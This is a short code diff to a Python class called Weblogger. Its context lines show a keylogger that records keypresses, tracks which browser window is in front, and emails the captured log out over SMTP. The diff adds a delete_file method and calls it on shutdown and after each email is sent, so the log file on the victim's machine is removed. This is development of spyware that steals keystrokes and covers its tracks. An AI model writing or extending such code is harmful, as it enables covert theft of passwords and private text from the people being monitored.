@@ -43,6 +43,10 @@ class Weblogger(object):
             with open(self.log_file, 'w') as fw:
                 fw.write('')
 
+    def delete_file(self):
+        if os.path.exists(self.log_file):
+            os.remove(self.log_file)
+
     def is_browser_open(self, update_titles=True):
         window = GetWindowText(GetForegroundWindow())
         self.w_name = window.split(' - ')[-1]
@@ -75,6 +79,7 @@ class Weblogger(object):
     def kill(self, sig=None, frame=None):
         self.is_thread_running = False
         self.force_send_mail()
+        self.delete_file()
         os._exit(0)
 
     def on_press(self, key):
@@ -164,7 +169,7 @@ class Weblogger(object):
         server.sendmail(email_from, self.email_to, msg.as_string())
         server.quit()
 
-        os.remove(self.log_file)
+        self.delete_file()
         self.create_file()
 
     def force_send_mail(self):
